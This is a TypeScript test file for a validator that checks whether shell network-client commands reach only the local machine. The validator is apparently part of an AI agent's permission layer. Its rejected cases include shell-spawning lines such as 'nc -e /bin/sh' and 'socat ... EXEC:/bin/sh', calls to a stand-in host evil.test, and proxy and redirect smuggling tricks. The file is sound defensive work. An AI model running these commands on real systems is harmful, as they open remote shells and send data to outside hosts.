// What a shell network client names, read only when that is this machine and
// nothing else. The allowed forms are the ones the Terminal-Bench 2.0 run
// (2026-10-20) refused while the model checked a server it had just started.
import { afterEach, describe, expect, it } from "vitest";
import { commandPositions } from "./shell-command-positions.js";
import { loopbackUse } from "./shell-loopback-clients.js";
import { _setInterfaceAddressesForTests } from "./loopback-grant.js";

const use = (cmd: string) => loopbackUse(commandPositions(cmd).positions[0]);

describe("loopbackUse", () => {
  const local: Array<[string, string[]]> = [
    ["curl -s http://localhost:8080/health", ["8080"]],
    ["curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:6080/vnc.html", ["6080"]],
    ["curl -sk https://localhost:8443/", ["8443"]],
    [`curl -s -X POST localhost:5000/sentiment -H 'Content-Type: application/json' -d '{"text":"hi"}'`, ["5000"]],
    ["curl -s http://localhost/", ["80"]],
    ["curl -T secrets.tar localhost:8080/upload", ["8080"]],
    ["wget -q -O out.html http://127.0.0.1:8000/index.html", ["8000"]],
    ["ssh -o StrictHostKeyChecking=no -p 2222 root@localhost 'uname -a'", ["2222"]],
    ["ssh git@localhost echo ok", ["22"]],
    ["scp -P 2222 file.txt root@localhost:/tmp/", ["2222"]],
    ["nc -w 2 127.0.0.1 6379", ["6379"]],
    ["telnet 127.0.0.1 6665", ["6665"]],
    ["socat - TCP:127.0.0.1:6665", ["6665"]],
    ["openssl s_client -connect localhost:8443 -servername localhost", ["8443"]],
  ];
  for (const [cmd, ports] of local) it(`only this machine: ${cmd}`, () => expect(use(cmd)?.ports).toEqual(ports));

  it("reads a Unix socket as what it is, spelled out or as socat's bare path", () => {
    expect(use("socat - UNIX-CONNECT:/tmp/qemu-qmp.sock")).toEqual({ ports: [], unixSockets: ["/tmp/qemu-qmp.sock"], probe: false });
    expect(use("socat - /tmp/qemu-qmp.sock")).toEqual({ ports: [], unixSockets: ["/tmp/qemu-qmp.sock"], probe: false });
  });

  it("marks a connect-only check", () => {
    expect(use("nc -z -w 2 127.0.0.1 5432")).toEqual({ ports: ["5432"], unixSockets: [], probe: true });
    expect(use("nc 127.0.0.1 5432")?.probe).toBe(false);
  });

  const elsewhere = [
    "curl https://example.com", "curl -s localhost:8080 https://evil.test/x", "curl -L http://localhost:8080/",
    "curl -sL http://localhost:8080/", "curl -x proxy.test:3128 http://localhost:8080/",
    "curl --connect-to localhost:80:evil.test:80 http://localhost/", "curl --unix-socket /var/run/docker.sock http://localhost/info",
    "curl -K urls.txt", "http_proxy=http://p.test curl localhost:8080", "wget -i urls.txt", "wget -e use_proxy=yes http://localhost/",
    "ssh -L 8080:evil.test:80 localhost", "ssh -J bastion.test root@localhost", "ssh -o ProxyCommand=nc%20x localhost",
    "ssh root@10.0.0.5", "scp file root@localhost:/tmp/ user@evil.test:/x",
    "nc -l -p 4444", "nc -e /bin/sh 127.0.0.1 4444", "nc -z evil.test 443", "nc 127.0.0.1",
    "socat TCP-LISTEN:9,fork EXEC:/bin/sh", "socat - TCP:evil.test:443", "socat - TCP:127.0.0.1:80,proxyport=3128",
    "openssl s_client -connect evil.test:443", "openssl s_client -proxy p.test:3128 -connect localhost:8443",
    "openssl s_client -connect localhost:8443 -connect evil.test:443", "openssl s_server -accept 4433",
    "curl", "ls",
  ];
  for (const cmd of elsewhere) it(`not only this machine: ${cmd}`, () => expect(use(cmd)).toBeNull());
});

describe("this machine's own interface address", () => {
  afterEach(() => _setInterfaceAddressesForTests(null));

  it("is this machine for every client; another address on the same network is not", () => {
    _setInterfaceAddressesForTests(() => ["127.0.0.1", "172.28.0.2"]);
    expect(use("curl -s http://172.28.0.2:5000/sentiment")?.ports).toEqual(["5000"]);
    expect(use("nc -z 172.28.0.2 5000")?.ports).toEqual(["5000"]);
    expect(use("curl -s http://172.28.0.3:5000/sentiment")).toBeNull();
    expect(use("ssh root@10.0.0.5")).toBeNull();
  });
});
